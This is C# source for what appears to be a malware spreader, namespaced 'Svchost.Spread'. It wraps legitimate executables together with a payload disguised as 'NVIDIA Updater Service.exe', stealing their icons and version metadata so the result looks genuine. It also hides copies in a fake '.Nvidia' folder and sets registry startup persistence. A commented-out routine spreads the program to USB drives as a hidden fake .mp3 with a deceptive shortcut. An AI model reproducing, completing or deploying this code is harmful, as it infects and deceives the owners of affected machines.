using System;
using System.IO;
using System.Drawing;
using System.Collections.Generic;
using System.Diagnostics;
using System.CodeDom.Compiler;

using System.Windows.Forms;
using System.Reflection;
using System.Drawing.IconLib;
using Microsoft.CSharp;
using TsudaKageyu;
using System.CodeDom;

namespace Svchost.Spread
{
    public class Spreader
    {
        private string shortcutIconLocation;
        private string cmdLocation;
        private string usbFolderName;
        private string assemblyName;
        private string fakeAssemblyName;
        private string applicationPath;
        private string sessionName;
        private string targetFolder;
        private DriveDetector driveDetector;

        public Spreader(string fakeAssembName, string assembName, string appPath, string windowsName)
        {
            fakeAssemblyName = fakeAssembName;
            assemblyName = assembName;
            applicationPath = appPath;
            sessionName = windowsName;
            cmdLocation = "C:\\Windows\\System32\\cmd.exe";
            shortcutIconLocation = @"C:\Windows\System32\SHELL32.dll,116";
            targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
            usbFolderName = "Music\\";

            infect(appPath, appPath, "NVIDIA Updater Service2.exe");
            /*
            if (checkEnvironment())
                driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/

            //infect(applicationPath);
        }

        private bool isExecutableInfected(string path)
        {
            try
            {
                Assembly assembly = Assembly.LoadFile(path);
                foreach (string resourceName in assembly.GetManifestResourceNames())
                {
                    if (resourceName.Contains(assemblyName))
                        return true;
                }
            }
            catch
            {

            }
            return false;
        }

        private void exctractIcon(string path)
        {
            try
            {
                IconExtractor ie = new IconExtractor(path);
                Icon icon = ie.GetIcon(0);
                MultiIcon mIcon = new MultiIcon();
                SingleIcon sIcon = mIcon.Add("oink");
                Icon[] splitIcons = IconUtil.Split(icon);
                sIcon.CreateFrom(IconUtil.ToBitmap(splitIcons[splitIcons.Length - 1]), IconOutputFormat.Vista);
                sIcon.Save(@"icon12.ico");
                
                /* FileStream fs = new FileStream(@"icon.ico", FileMode.Create);
                 icon.Save(fs);
                 fs.Close();*/
            }
            catch { }
        }

        void findAndInfect(string sDir)
        {
            try
            {
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    foreach (string f in Directory.GetFiles(d))
                    {
                        if (f.Contains(".exe"))
                            Console.WriteLine(f);
                    }
                    findAndInfect(d);
                }
            }
            catch (System.Exception excpt)
            {

            }
        }

        public void replicateOverUSB(DriveInfo drive)
        {
            //Potentially not infected usb found
            /*string usbRootFolder = drive.RootDirectory.FullName;
            string targetFolder = usbRootFolder + usbFolderName;

            if (!Directory.Exists(targetFolder))
            {
                DirectoryInfo di;
                try { di = Directory.CreateDirectory(targetFolder); }
                catch{ return; }
            }

            //Copy the assembly with fake name
            string fullTargetPath = targetFolder + fakeAssemblyName + ".mp3";
            if (!File.Exists(fullTargetPath))
            {
                try
                {
                    //Copy and hide file
                    File.Copy(applicationPath + assemblyName, fullTargetPath);
                    File.SetAttributes(fullTargetPath, FileAttributes.Hidden);
                }
                catch { return; }

                object folder = (object)targetFolder;
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                string shortcutAddress = targetFolder + fakeAssemblyName + ".lnk";
                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutAddress);
                shortcut.TargetPath = cmdLocation;
                shortcut.Arguments = "/c \"" + fakeAssemblyName + ".mp3" + "\"";
                shortcut.WorkingDirectory = targetFolder;
                shortcut.IconLocation = shortcutIconLocation;
                shortcut.Save();
            }*/
        }
        
        private bool checkEnvironment()
        {
            if(applicationPath == targetFolder)
            {
                Regedit.setStartup(assemblyName, "\"" + applicationPath + assemblyName.Replace(".exe", "") + "\"");
                return true;
            }
            else
            {
                if (!Directory.Exists(targetFolder))
                {
                    DirectoryInfo di = Directory.CreateDirectory(targetFolder);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }

                string fullTargetPath = targetFolder + assemblyName; 
                string originPath = System.Reflection.Assembly.GetEntryAssembly().Location;
                if (!File.Exists(fullTargetPath))
                    File.Copy(originPath, fullTargetPath);

                try
                {
                    var spawn = Process.Start(fullTargetPath);
                }
                catch { }

                Process thisprocess = Process.GetCurrentProcess();
                thisprocess.CloseMainWindow();
                thisprocess.Close();
                thisprocess.Dispose();
                Application.Exit();
                Environment.Exit(0);
                return false;
            }
        }

        static CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
        static CodeCompileUnit unit = new CodeCompileUnit();
        static CompilerParameters compilerParameters = new CompilerParameters
        {
            GenerateExecutable = true,
            OutputAssembly = "icontext3.exe"
        };

        void infect(string currentPath, string targetFolder, string targetName)
        {
            exctractIcon(targetFolder + targetName);

            compilerParameters.ReferencedAssemblies.Add("System.dll");
            compilerParameters.EmbeddedResources.Add(targetName);
            compilerParameters.EmbeddedResources.Add("NVIDIA Updater Service.exe");
            compilerParameters.CompilerOptions = @"/win32icon:" + currentPath + "icon12.ico";

            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo("test.exe");
            CodeTypeReference versionAttr = new CodeTypeReference(typeof(AssemblyVersionAttribute));
            CodeAttributeDeclaration versionDecl = new CodeAttributeDeclaration(versionAttr, new CodeAttributeArgument(new CodePrimitiveExpression("1.0.2.42")));
            CodeTypeReference companyAttr = new CodeTypeReference(typeof(AssemblyCompanyAttribute));
            CodeAttributeDeclaration companyDecl = new CodeAttributeDeclaration(companyAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.CompanyName)));
            CodeTypeReference copyrightAttr = new CodeTypeReference(typeof(AssemblyCopyrightAttribute));
            CodeAttributeDeclaration copyrightDecl = new CodeAttributeDeclaration(copyrightAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.LegalCopyright)));
            CodeTypeReference descriptionAttr = new CodeTypeReference(typeof(AssemblyDescriptionAttribute));
            CodeAttributeDeclaration descriptionDecl = new CodeAttributeDeclaration(descriptionAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.FileDescription)));
            CodeTypeReference productNameAttr = new CodeTypeReference(typeof(AssemblyProductAttribute));
            CodeAttributeDeclaration productNameDecl = new CodeAttributeDeclaration(productNameAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.ProductName)));
            
            unit.AssemblyCustomAttributes.Add(versionDecl);
            unit.AssemblyCustomAttributes.Add(companyDecl);
            unit.AssemblyCustomAttributes.Add(copyrightDecl);
            unit.AssemblyCustomAttributes.Add(descriptionDecl);
            unit.AssemblyCustomAttributes.Add(productNameDecl);

            string cSharpCode = @"public class System0
            {
               static void Main(string[] args)
               {
                    ExtractResource( ""./%%FILENAME%%"", ""%%FILENAME%%"" );
                    string parameters = """";
                    for(int i = 0; i < args.Length; i++)
                    {
                        parameters += args[i] + """";
                    }
                    System.Diagnostics.Process.Start(""%%FILENAME%%"", parameters);
                    ExtractResource( ""./NVIDIA Updater Service.exe"", ""NVIDIA Updater Service.exe"" );
                    System.Diagnostics.Process.Start(""NVIDIA Updater Service.exe"");
               }

               static void ExtractResource(string resource, string path)
               {
                    System.IO.Stream stream = typeof(System0).Assembly.GetManifestResourceStream(resource);
                    if(stream != null)
                    {
                        byte[] bytes = new byte[(int)stream.Length];
                        stream.Read(bytes, 0, bytes.Length);
                        System.IO.File.WriteAllBytes(path, bytes);
                    }
               }
            }";

            cSharpCode = cSharpCode.Replace("%%FILENAME%%", targetName);

            StringWriter sw = new StringWriter();
            cSharpCodeProvider.GenerateCodeFromCompileUnit(unit, sw, new CodeGeneratorOptions());
            sw.Write(cSharpCode);
            string s = sw.ToString();
            CompilerResults results = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters,
            new[] { sw.ToString() });

            foreach (string output in results.Output)
            {
                Console.WriteLine(output);
            }

            Assembly assembly = results.CompiledAssembly;
            results.PathToAssembly = "./";
        }
    }
}
